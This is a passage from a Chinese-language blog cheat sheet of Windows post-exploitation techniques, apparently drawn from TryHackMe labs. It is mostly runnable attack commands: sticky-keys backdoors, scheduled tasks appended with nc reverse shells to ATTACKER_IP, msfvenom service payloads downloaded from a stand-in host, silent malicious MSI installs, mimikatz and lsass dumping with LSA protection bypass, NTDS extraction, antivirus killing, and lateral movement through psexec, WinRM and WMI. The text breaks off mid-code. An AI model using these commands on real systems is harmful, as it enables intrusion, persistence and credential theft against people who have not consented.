创建一个REG_EXPAND_SZ注册表项，随意起名</span><br></code></pre></td></tr></table></figure><h4 id="Winlogon"><a href="#Winlogon" class="headerlink" title="Winlogon"></a>Winlogon</h4><p>注册表项</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon<br><br><span class="hljs-comment"># Userinit和shell都可，不要破坏原本程序，可以白加黑或逗号分隔命令</span><br></code></pre></td></tr></table></figure><h4 id="Logon-scripts"><a href="#Logon-scripts" class="headerlink" title="Logon scripts"></a>Logon scripts</h4><p>环境变量（其实还是注册表项）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">HKCU\Environment<br><br><span class="hljs-comment"># 条目</span><br>UserInitMprLogonScript<br></code></pre></td></tr></table></figure><h3 id="登录界面-RDP"><a href="#登录界面-RDP" class="headerlink" title="登录界面 / RDP"></a>登录界面 / RDP</h3><h4 id="Sticky-Keys-粘滞键"><a href="#Sticky-Keys-粘滞键" class="headerlink" title="Sticky Keys(粘滞键)"></a>Sticky Keys(粘滞键)</h4><p>连续按 <code>SHIFT</code> 5次激活粘滞键会执行<code>C:\Windows\System32\sethc.exe</code></p><p>提前替换<code>C:\Windows\System32\sethc.exe</code>即可</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">takeown /f c:\Windows\System32\sethc.exe<span class="hljs-comment"># 将 sethc.exe 文件的所有权更改为当前用户(机器名/管理员，用whoami可查看)</span><br>icacls C:\Windows\System32\sethc.exe /grant Administrator:F<span class="hljs-comment"># 为管理员用户授予对 sethc.exe 文件的完全控制权限</span><br><span class="hljs-built_in">copy</span> c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe<span class="hljs-comment"># 将 cmd.exe 复制并替换为 sethc.exe</span><br></code></pre></td></tr></table></figure><h4 id="Utilman"><a href="#Utilman" class="headerlink" title="Utilman"></a>Utilman</h4><p>无障碍服务，点击执行<code>C:\Windows\System32\Utilman.exe</code></p><p>将其替换即可，过程同上</p><h3 id="Web服务相关"><a href="#Web服务相关" class="headerlink" title="Web服务相关"></a>Web服务相关</h3><h4 id="Web-Shell"><a href="#Web-Shell" class="headerlink" title="Web Shell"></a>Web Shell</h4><p><a href="https://github.com/tennc/webshell">webshell</a></p><h4 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h4><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">whoami /priv       <span class="hljs-comment">#列出当前用户账户所具有的特权</span><br>findstr /S /I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml  <span class="hljs-comment">#Windows识别组策略文件中可能以明文或易于解密的格式存储密码的位置</span><br>findstr /<span class="hljs-built_in">si</span> <span class="hljs-string">&#x27;password&#x27;</span> *.txt *.xml *.docx  <span class="hljs-comment">#查找内容有 password 的文件</span><br></code></pre></td></tr></table></figure><h3 id="自动化-1"><a href="#自动化-1" class="headerlink" title="自动化"></a>自动化</h3><h4 id="PrivescCheck"><a href="#PrivescCheck" class="headerlink" title="PrivescCheck"></a>PrivescCheck</h4><p><a href="https://github.com/itm4n/PrivescCheck">PrivescCheck</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">. .\PrivescCheck.ps1; <span class="hljs-built_in">Invoke-PrivescCheck</span> <span class="hljs-literal">-Extended</span><br></code></pre></td></tr></table></figure><h4 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h4><p><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">. .\PowerUp.ps1<br><span class="hljs-built_in">Invoke-AllChecks</span><br></code></pre></td></tr></table></figure><h4 id="Potato"><a href="#Potato" class="headerlink" title="Potato"></a>Potato</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">使用Potato提权都需要下列两个特权中的一个。<br><span class="hljs-number">1</span>.SeImpersonatePrivilege（替换一个进程级令牌）<br><span class="hljs-number">2</span><span class="hljs-selector-class">.SeAssignPrimaryTokenPrivilege</span> （身份验证后模拟客户端）<br></code></pre></td></tr></table></figure><h3 id="手工"><a href="#手工" class="headerlink" title="手工"></a>手工</h3><h4 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">schtasks<span class="hljs-comment"># 列出所有计划任务</span><br>schtasks /query /tn vulntask /fo list /v<span class="hljs-comment"># 查看vulntask计划任务的详细信息</span><br>icacls c:\tasks\schtask.bat<span class="hljs-comment"># 查看可执行文件权限</span><br><span class="hljs-built_in">echo</span> c:\tools\nc64.exe <span class="hljs-literal">-e</span> cmd.exe ATTACKER_IP <span class="hljs-number">4444</span> &gt;&gt; C:\tasks\schtask.bat<span class="hljs-comment"># 将反弹shell命令追加到末尾</span><br>schtasks /run /tn vulntask<span class="hljs-comment"># 手动启动vulntask计划任务</span><br></code></pre></td></tr></table></figure><h4 id="配置错误"><a href="#配置错误" class="headerlink" title="配置错误"></a>配置错误</h4><h5 id="服务配置错误"><a href="#服务配置错误" class="headerlink" title="服务配置错误"></a>服务配置错误</h5><p>所有服务配置都存储在注册表下的 <code>HKLM\SYSTEM\CurrentControlSet\Services\</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> query<span class="hljs-comment"># 查看所有服务</span><br><span class="hljs-built_in">sc</span> qc apphostsvc<span class="hljs-comment"># 查看apphostsvc服务的配置信息</span><br></code></pre></td></tr></table></figure><h6 id="服务可执行文件权限不安全"><a href="#服务可执行文件权限不安全" class="headerlink" title="服务可执行文件权限不安全"></a>服务可执行文件权限不安全</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell">icacls C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>\WService.exe<span class="hljs-comment"># 检查服务可执行文件的权限</span><br>msfvenom <span class="hljs-literal">-p</span> windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=<span class="hljs-number">4445</span> <span class="hljs-operator">-f</span> exe<span class="hljs-literal">-service</span> <span class="hljs-literal">-o</span> rev<span class="hljs-literal">-svc</span>.exe  <span class="hljs-comment">#用msfvenom生成payload</span><br>python3 <span class="hljs-literal">-m</span> http.server<span class="hljs-comment"># 起http</span><br><span class="hljs-built_in">wget</span> http://ATTACKER_IP:<span class="hljs-number">8000</span>/rev<span class="hljs-literal">-svc</span>.exe <span class="hljs-literal">-O</span> rev<span class="hljs-literal">-svc</span>.exe<span class="hljs-comment"># 提取</span><br><br><span class="hljs-built_in">cd</span> C:\PROGRA~<span class="hljs-number">2</span>\SYSTEM~<span class="hljs-number">1</span>\<span class="hljs-comment"># 进入可执行文件路径</span><br><span class="hljs-built_in">move</span> WService.exe WService.exe.bkp<span class="hljs-comment"># 备份原exe</span><br><span class="hljs-built_in">move</span> C:\Users\thm<span class="hljs-literal">-unpriv</span>\rev<span class="hljs-literal">-svc</span>.exe WService.exe<span class="hljs-comment"># 鸠占鹊巢</span><br>icacls WService.exe /grant Everyone:F<span class="hljs-comment"># 授予Everyone组完全权限</span><br><br><span class="hljs-comment"># 重启服务，一般没这个权限</span><br><span class="hljs-built_in">sc</span> stop windowsscheduler<br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> windowsscheduler<br></code></pre></td></tr></table></figure><h5 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 两个结果都为1时说明可利用</span><br>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br><br><span class="hljs-comment">#  类似于 wget 或 curl，用于下载文件</span><br><span class="hljs-built_in">IWR</span> <span class="hljs-literal">-Uri</span> http://<span class="hljs-number">172.16</span>.<span class="hljs-number">1.30</span>/evil.msi <span class="hljs-literal">-OutFile</span> evil.msi<br><br><span class="hljs-comment"># 执行(安装)msi文件</span><br>msiexec /i evil.msi<span class="hljs-comment"># 基本执行</span><br>msiexec /i evil.msi /quiet /norestart<span class="hljs-comment"># 静默安装，并设置安装后不重启</span><br><span class="hljs-comment"># 在powershell中静默执行</span><br><span class="hljs-built_in">Start-Process</span> msiexec <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&quot;/i evil.msi /quiet /norestart&quot;</span> <span class="hljs-literal">-WindowStyle</span> <span class="hljs-keyword">Hidden</span> <span class="hljs-literal">-NoNewWindow</span><br><span class="hljs-comment"># 下载到内存中安装，不在磁盘上留下痕迹</span><br><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">IWR</span> <span class="hljs-literal">-Uri</span> http://<span class="hljs-number">172.16</span>.<span class="hljs-number">1.30</span>/evil.msi <span class="hljs-literal">-UseBasicParsing</span>) | msiexec /i - /quiet /norestart<br></code></pre></td></tr></table></figure><h4 id="已获取凭据"><a href="#已获取凭据" class="headerlink" title="已获取凭据"></a>已获取凭据</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">runas /savecred /user:admin cmd.exe<span class="hljs-comment">#以 admin 用户的身份启动一个新的cmd，第一次运行需输入密码</span><br></code></pre></td></tr></table></figure><h2 id="拥有本地管理员权限"><a href="#拥有本地管理员权限" class="headerlink" title="拥有本地管理员权限"></a>拥有本地管理员权限</h2><h4 id="获取密码-1"><a href="#获取密码-1" class="headerlink" title="获取密码"></a>获取密码</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#创建一个名为 lsass.dmp 的文件，其中包含了 lsass.exe 进程的完整内存转储</span><br>procdump.exe <span class="hljs-literal">-accepteula</span> <span class="hljs-literal">-ma</span> lsass.exe lsass.dmp<br><br><span class="hljs-comment">#加载lsass.dmp，提取登录凭据</span><br>mimikatz <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><br><span class="hljs-comment">#提升权限，直接从内存中提取登录密码，并从SAM数据库中提取信息</span><br>mimikatz <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;lsadump::sam&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br><br><span class="hljs-comment">#msf模块</span><br>post/windows/gather/smart_hashdump  <br><br><span class="hljs-comment">#在指定的IP范围内，使用提供的用户名和密码尝试通过SMB服务登录目标系统，并执行 lsassy 模块来提取凭据信息</span><br>crackmapexec smb &lt;ip_range&gt; <span class="hljs-literal">-u</span> &lt;user&gt; <span class="hljs-literal">-p</span> &lt;password&gt; <span class="hljs-literal">-M</span> lsassy<br><span class="hljs-comment">#在指定的IP范围内，使用提供的用户名和密码尝试通过SMB服务登录目标系统，并选择性地从SAM、LSA或NTDS数据库中提取信息</span><br>crackmapexec smb &lt;ip_range&gt; <span class="hljs-literal">-u</span> &lt;user&gt; <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;&lt;password&gt;&#x27;</span> <span class="hljs-literal">--sam</span> / <span class="hljs-literal">--lsa</span> / <span class="hljs-literal">--ntds</span><br><br><span class="hljs-comment">#查看本地存储的所有密码,包括各种常用软件的密码</span><br>laZagne.exe all<br></code></pre></td></tr></table></figure><h4 id="绕过LSA防护策略读取密码"><a href="#绕过LSA防护策略读取密码" class="headerlink" title="绕过LSA防护策略读取密码"></a>绕过LSA防护策略读取密码</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">PPLdump64.exe &lt;lsass.exe|lsass_pid&gt; lsass.dmp <span class="hljs-comment">#创建LSASS进程的内存转储</span><br><br><span class="hljs-comment">#移除对 LSASS 进程的保护、提升权限、获取系统登录密码信息，并在完成后重新启用 LSASS 进程保护</span><br>mimikatz <span class="hljs-string">&quot;!+&quot;</span> <span class="hljs-string">&quot;!processprotect /process:lsass.exe /remove&quot;</span> <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;!processprotect /process:lsass.exe&quot;</span> <span class="hljs-string">&quot;!-&quot;</span> <span class="hljs-comment">#with mimidriver.sys</span><br></code></pre></td></tr></table></figure><h4 id="token窃取"><a href="#token窃取" class="headerlink" title="token窃取"></a>token窃取</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\incognito.exe list_tokens <span class="hljs-literal">-u</span><span class="hljs-comment">#列出当前用户会话中与当前用户相关的所有令牌</span><br>.\incognito.exe execute <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;&lt;domain&gt;\&lt;user&gt;&quot;</span> powershell.exe   <span class="hljs-comment">#模拟指定用户启动powershell</span><br>.\incognito.exe execute <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;完整的Token名&quot;</span> cmd.exe<span class="hljs-comment">#模拟指定用户启动命令行</span><br>.\incognito.exe execute <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;NT AUTHORITY\SYSTEM&quot;</span> cmd.exe    <span class="hljs-comment">#此为上条的一个例子</span><br><br><span class="hljs-comment">#在msf中</span><br>use incognito<br>impersonate_token &lt;domain&gt;\\&lt;user&gt;<br></code></pre></td></tr></table></figure><h4 id="卷影拷贝（获取域控所有hash）"><a href="#卷影拷贝（获取域控所有hash）" class="headerlink" title="卷影拷贝（获取域控所有hash）"></a>卷影拷贝（获取域控所有hash）</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">diskshadow list shadows all<span class="hljs-comment">#列出系统上所有现有的卷影副本</span><br>mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\  <span class="hljs-comment">#创建一个符号链接，将 c:\shadowcopy 目录链接到特定卷影副本的位置</span><br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#管理员权限执行</span><br>vssadmin create shadow /<span class="hljs-keyword">for</span>=C:<span class="hljs-comment">#为 C: 盘（系统盘）创建一个卷影副本</span><br><span class="hljs-comment">#利用卷影副本卷名拷贝ntds.dit文件与用注册表导出system.hive</span><br><span class="hljs-built_in">copy</span> \\?\GLOBALLROOT\Device\xxxxxxxxxx\windows\ntds\ntds.dit C:\ntds.dit <span class="hljs-comment">#将拷贝卷影副本中的 ntds.dit 文件到本地系统的 C:\ntds.dit</span><br>reg sava hklm\system system.hive  <span class="hljs-comment">#将注册表中的 System Hive 导出为 system.hive</span><br>vssadmin delete shadows /<span class="hljs-keyword">for</span>=C: /quiet <span class="hljs-comment">#删除之前创建的卷影副本，并通过 /quiet 参数静默删除，不显示任何输出</span><br></code></pre></td></tr></table></figure><p><a href="https://0range-x.github.io/2021/11/22/CVE-2020-1472/">https://0range-x.github.io/2021/11/22/CVE-2020-1472/</a></p><h4 id="关闭杀软"><a href="#关闭杀软" class="headerlink" title="关闭杀软"></a>关闭杀软</h4><h5 id="卡巴斯基"><a href="#卡巴斯基" class="headerlink" title="卡巴斯基"></a>卡巴斯基</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">taskkill /IM avp.exe /IM avpsus.exe /IM avpui.exe /IM avpui.exe /F   <span class="hljs-comment">#关闭相关进程，但似乎没啥效果，马上又重启了</span><br></code></pre></td></tr></table></figure><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="创建远程连接"><a href="#创建远程连接" class="headerlink" title="创建远程连接"></a>创建远程连接</h3><h4 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">psexec64.exe \\MACHINE_IP <span class="hljs-literal">-u</span> Administrator <span class="hljs-literal">-p</span> Mypass123 <span class="hljs-literal">-i</span> cmd.exe<br>ssh za\\rachael.atkinson@thmjmp2.za.tryhackme.com<br>msfvenom <span class="hljs-literal">-p</span> windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=<span class="hljs-number">4445</span> <span class="hljs-operator">-f</span> msi &gt; cl0v3.msi<br>use exploit/multi/handler<br></code></pre></td></tr></table></figure><h4 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h4><p>windows自带</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">winrs.exe <span class="hljs-literal">-u</span>:Administrator <span class="hljs-literal">-p</span>:Mypass123 <span class="hljs-literal">-r</span>:target cmd<br></code></pre></td></tr></table></figure><p>用powershell实现相同效果：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 创建 PSCredential 对象</span><br><span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;Administrator&#x27;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;Mypass123&#x27;</span>;<br><span class="hljs-variable">$securePassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-variable">$password</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>; <br><span class="hljs-variable">$credential</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span>;<br><br><span class="hljs-comment"># 使用 Enter-PSSession 命令行工具创建交互式会话,用于长时间交互</span><br><span class="hljs-built_in">Enter-PSSession</span> <span class="hljs-literal">-Computername</span> TARGET <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$credential</span><br><br><span class="hljs-comment"># Invoke-Command 通过 WinRM 远程运行 ScriptBlocks，简单执行一条命令</span><br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-Computername</span> TARGET <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$credential</span> <span class="hljs-literal">-ScriptBlock</span> &#123;whoami&#125;<br></code></pre></td></tr></table></figure><h4 id="使用-sc-远程创建服务"><a href="#使用-sc-远程创建服务" class="headerlink" title="使用 sc 远程创建服务"></a>使用 sc 远程创建服务</h4><p>自带</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 创建并启动一个名为 &quot;THMservice&quot; 的服务</span><br>sc.exe \\TARGET create THMservice binPath= <span class="hljs-string">&quot;net user munra Pass123 /add&quot;</span> <span class="hljs-built_in">start</span>= auto<br>sc.exe \\TARGET <span class="hljs-built_in">start</span> THMservice<br><br><span class="hljs-comment"># 停止并删除服务</span><br>sc.exe \\TARGET stop THMservice<br>sc.exe \\TARGET delete THMservice<br></code></pre></td></tr></table></figure><h4 id="创建远程计划任务"><a href="#创建远程计划任务" class="headerlink" title="创建远程计划任务"></a>创建远程计划任务</h4><p>盲攻击，无法看到输出</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 创建一个名为 THMtask1 的任务,设置在指定的时间和日期仅运行一次</span><br>schtasks /s TARGET /RU <span class="hljs-string">&quot;SYSTEM&quot;</span> /create /tn <span class="hljs-string">&quot;THMtask1&quot;</span> /tr <span class="hljs-string">&quot;&lt;command/payload to execute&gt;&quot;</span> /<span class="hljs-built_in">sc</span> ONCE /sd <span class="hljs-number">01</span>/<span class="hljs-number">01</span>/<span class="hljs-number">1970</span> /st <span class="hljs-number">00</span>:<span class="hljs-number">00</span> <br>schtasks /s TARGET /run /TN <span class="hljs-string">&quot;THMtask1&quot;</span> <span class="hljs-comment"># 手动运行该任务,因此指定的开始日期和开始时间无影响</span><br>schtasks /S TARGET /TN <span class="hljs-string">&quot;THMtask1&quot;</span> /DELETE /F<span class="hljs-comment"># 删除计划任务，清理现场</span><br></code></pre></td></tr></table></figure><h3 id="利用WMI"><a href="#利用WMI" class="headerlink" title="利用WMI"></a>利用WMI</h3><h4 id="从-PowerShell-连接到-WMI-前置准备"><a href="#从-PowerShell-连接到-WMI-前置准备" class="headerlink" title="从 PowerShell 连接到 WMI(前置准备)"></a>从 PowerShell 连接到 WMI(前置准备)</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 创建 PSCredential 对象</span><br><span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;Administrator&#x27;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;Mypass123&#x27;</span>;<br><span class="hljs-variable">$securePassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-variable">$password</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>;<br><span class="hljs-variable">$credential</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span>;<br><br><span class="hljs-comment">#  建立 WMI 会话并将会话存储在$Session 变量中，此处DCOM可替换为Wsman</span><br><span class="hljs-variable">$Opt</span> = <span class="hljs-built_in">New-CimSessionOption</span> <span class="hljs-literal">-Protocol</span> DCOM<br><span class="hljs-variable">$Session</span> = <span class="hljs-built_in">New-Cimsession</span> <span class="hljs-literal">-ComputerName</span> TARGET <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$credential</span> <span class="hljs-literal">-SessionOption</span> <span class="hljs-variable">$Opt</span> <span class="hljs-literal">-ErrorAction</span> Stop<br></code></pre></td></tr></table></figure><h4 id="创建远程进程"><a href="#创建远程进程" class="headerlink" title="创建远程进程"></a>创建远程进程</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 向 Win32_Process 类发送 WMI 请求，在之前创建的会话中启动进程</span><br><span class="hljs-variable">$Command</span> = <span class="hljs-string">&quot;powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere&quot;</span>;<br><br><span class="hljs-built_in">Invoke-CimMethod</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-ClassName</span> Win32_Process <span class="hljs-literal">-MethodName</span> Create <span class="hljs-literal">-Arguments</span> <span class="hljs-selector-tag">@</span>&#123;<br>CommandLine = <span class="hljs-variable">$Command</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在传统系统中，使用如下cmd命令实现相同操作</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic.exe /user:Administrator /password:Mypass123 /node:TARGET <span class="hljs-keyword">process</span> call create <span class="hljs-string">&quot;cmd.exe /c calc.exe&quot;</span> <br></code></pre></td></tr></table></figure><h4 id="远程创建服务"><a href="#远程创建服务" class="headerlink" title="远程创建服务"></a>远程创建服务</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 创建一个名为 THMService2 的服务</span><br><span class="hljs-built_in">Invoke-CimMethod</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-ClassName</span> Win32_Service <span class="hljs-literal">-MethodName</span> Create <span class="hljs-literal">-Arguments</span> <span class="hljs-selector-tag">@</span>&#123;<br>Name = <span class="hljs-string">&quot;THMService2&quot;</span>; <span class="hljs-comment"># 服务名称</span><br>DisplayName = <span class="hljs-string">&quot;THMService2&quot;</span>; <span class="hljs-comment"># 服务显示名称</span><br>PathName = <span class="hljs-string">&quot;net user munra2 Pass123 /add&quot;</span>; <span class="hljs-comment"># 你的有效负载</span><br>ServiceType = [<span class="hljs-built_in">byte</span>]::Parse(<span class="hljs-string">&quot;16&quot;</span>); <span class="hljs-comment"># Win32OwnProcess : 在新进程中启动服务</span><br>StartMode = <span class="hljs-string">&quot;Manual&quot;</span> <span class="hljs-comment"># 启动模式为手动</span><br><br><span class="hljs-comment"># 启动服务</span><br><span class="hljs-variable">$Service</span> = <span class="hljs-built_in">Get-CimInstance</span> <span class="hljs-literal">-CimSession</span> <span class="hljs-variable">$Session</span> <span class="hljs-literal">-ClassName</span> Win32_Service <span class="hljs-literal">-filter</span> <span class="hljs-string">&quot;Name LIKE &#x27;THMService2&#x27;&quot;</span><br><span class="hljs-built_in">Invoke-CimMethod</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$Service</span> <span class="hljs-literal">-MethodName</span> StartService<br><br><span class="hljs-comment"># 停止并删除服务</span><br><span class="hljs-built_in">Invoke-CimMethod</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$Service</span> <span class="hljs-literal">-MethodName</span> StopService<br><span class="hljs-built_in">Invoke-CimMethod</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$Service</span> <span class="hljs-literal">-MethodName</span> Delete<br></code></pre></td></tr></table></figure><h4 id="远程创建计划任务"><a href="#远程创建计划任务" class="headerlink" title="远程创建计划任务"></a>远程创建计划任务</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 